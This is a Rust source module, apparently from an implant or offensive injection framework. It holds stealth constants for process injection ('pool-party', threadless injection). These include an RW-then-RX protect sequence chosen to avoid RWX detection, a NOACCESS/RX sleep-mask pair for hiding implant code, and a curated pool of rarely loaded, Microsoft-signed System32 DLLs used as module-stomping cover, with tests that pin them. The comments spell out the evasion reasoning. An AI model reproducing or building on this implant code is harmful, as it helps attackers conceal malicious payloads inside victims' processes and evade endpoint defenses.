//! Host-testable stealth constants shared by the inject / pool-party paths.
//!
//! Lives outside the Windows-only modules so macOS `cargo test` can pin the
//! cover-DLL pool and the final protect constant without a Windows target.

/// `PAGE_NOACCESS` — Fluctuation sleep-mask flip (fluctuation_thunk Step 1).
pub const PAGE_NOACCESS: u32 = 0x01;
/// `PAGE_READWRITE` — allocation protect before a payload write (never RWX).
pub const PAGE_READWRITE: u32 = 0x04;
/// `PAGE_EXECUTE_READ` — steady-state protect after the payload is written.
pub const PAGE_EXECUTE_READ: u32 = 0x20;
/// `PAGE_EXECUTE_READWRITE` — forbidden as a steady-state VAD protect.
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;

/// Final protect applied after the payload/stub is written. Used by
/// `threadless_inject_alloc`, `inject_existing_stage_alloc`, and the
/// pool-party stub/section path so the recorded NewProtect is RX, not RWX.
pub fn desired_final_protect() -> u32 {
    PAGE_EXECUTE_READ
}

/// Protect used at `NtAllocateVirtualMemory` / local section-map time: RW,
/// then write, then [`desired_final_protect`]. Never 0x40.
pub fn payload_alloc_protect() -> u32 {
    PAGE_READWRITE
}

/// Fluctuation sleep-mask protect pair: NOACCESS during sleep, RX on wake.
/// Selftest applies these to a scratch page, never the implant `.text`.
pub fn fluctuation_protect_pair() -> (u32, u32) {
    (PAGE_NOACCESS, PAGE_EXECUTE_READ)
}

/// Cover-DLL pool for module stomping. Microsoft-signed, rarely-loaded,
/// present on Win10 / Server 2019+ System32. `xpsservices.dll` stays first
/// for backward behavior. `mshtml.dll` is excluded (too common / huge).
/// Each entry is NUL-terminated for `LoadLibraryA`.
///
/// Justifications (all `C:\Windows\System32`):
/// - `xpsservices.dll` — XPS print path; classic stomp cover, rarely loaded.
/// - `colorui.dll` — color-management UI; not a hot-path dependency.
/// - `dpx.dll` — Delta Package Expander (CBS/DISM); not loaded by typical apps.
/// - `cryptui.dll` — CryptoAPI certificate UI; loaded only when that UI runs.
pub const COVER_DLL_POOL: &[&[u8]] = &[
    b"xpsservices.dll\0",
    b"colorui.dll\0",
    b"dpx.dll\0",
    b"cryptui.dll\0",
];

/// Cover-pool LoadLibrary failure, indexed like [`COVER_DLL_POOL`].
pub const COVER_LOAD_FAIL: &[&str] = &[
    "xpsservices.dll: LoadLibraryA failed",
    "colorui.dll: LoadLibraryA failed",
    "dpx.dll: LoadLibraryA failed",
    "cryptui.dll: LoadLibraryA failed",
];

/// Cover-pool `.text` too small for the payload, indexed like [`COVER_DLL_POOL`].
pub const COVER_TOO_SMALL: &[&str] = &[
    "xpsservices.dll: .text smaller than payload",
    "colorui.dll: .text smaller than payload",
    "dpx.dll: .text smaller than payload",
    "cryptui.dll: .text smaller than payload",
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn desired_final_protect_is_rx_not_rwx() {
        assert_eq!(desired_final_protect(), 0x20);
        assert_ne!(desired_final_protect(), PAGE_EXECUTE_READWRITE);
        assert_eq!(payload_alloc_protect(), PAGE_READWRITE);
        assert_ne!(payload_alloc_protect(), PAGE_EXECUTE_READWRITE);
        let (noacc, rx) = fluctuation_protect_pair();
        assert_eq!(noacc, PAGE_NOACCESS);
        assert_eq!(rx, PAGE_EXECUTE_READ);
    }

    #[test]
    fn protect_sequence_records_final_rx() {
        // Byte-level stand-in for the alloc-RW → write → protect-RX sequence
        // (live NtProtect is Windows-only). Last NewProtect must be 0x20.
        // Covers threadless_inject_alloc, pool-party stubs, and
        // inject_existing_stage_alloc (method 2 + pid≠0).
        let alloc_protect = payload_alloc_protect();
        let last_new_protect = desired_final_protect();
        assert_eq!(alloc_protect, PAGE_READWRITE);
        assert_eq!(last_new_protect, PAGE_EXECUTE_READ);
        assert_ne!(last_new_protect, PAGE_EXECUTE_READWRITE);
    }

    #[test]
    fn cover_dll_pool_contract() {
        assert!(!COVER_DLL_POOL.is_empty());
        assert_eq!(COVER_DLL_POOL.len(), COVER_LOAD_FAIL.len());
        assert_eq!(COVER_DLL_POOL.len(), COVER_TOO_SMALL.len());
        assert!(COVER_DLL_POOL[0].starts_with(b"xpsservices.dll"));
        let mut seen: alloc::vec::Vec<&[u8]> = alloc::vec::Vec::new();
        for dll in COVER_DLL_POOL {
            assert_eq!(dll.last().copied(), Some(0), "NUL-terminated");
            assert!(
                !dll.starts_with(b"mshtml.dll"),
                "mshtml.dll is too common/huge"
            );
            assert!(
                !seen.iter().any(|&p| p == *dll),
                "cover DLL pool entries must be unique"
            );
            seen.push(*dll);
        }
    }
}
